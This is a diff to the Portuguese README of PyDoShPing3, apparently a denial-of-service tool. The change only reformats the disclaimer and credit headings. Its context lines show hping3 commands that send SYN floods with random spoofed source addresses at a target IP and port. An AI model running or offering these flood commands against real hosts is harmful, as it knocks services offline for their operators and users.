@@ -68,7 +68,8 @@ hping3 -S --rand-source --flood -V -p "PORTS" -d 120 "IP"
 hping3 -c 100000 -d 10000 -S -p "PORTS" --flood --rand-source "IP" 
  ```
  
-# [!]Isenção de responsabilidade
-## Esta ferramenta é desenvolvida para fins educacionais. Você tem suas próprias responsabilidades e é responsável por qualquer dano ou violação de leis por esta ferramenta. O autor não é responsável por qualquer uso indevido do PyDoShPing3! 
+# [!] Isenção de responsabilidade
+
+### Esta ferramenta é desenvolvida para fins educacionais. Você tem suas próprias responsabilidades e é responsável por qualquer dano ou violação de leis por esta ferramenta. O autor não é responsável por qualquer uso indevido do PyDoShPing3! 
  
- # Este repositório é de código aberto para ajudar os outros. Portanto, se desejar copiar, considere dar os créditos! 
+### Este repositório é de código aberto para ajudar os outros. Portanto, se desejar copiar, considere dar os créditos! 
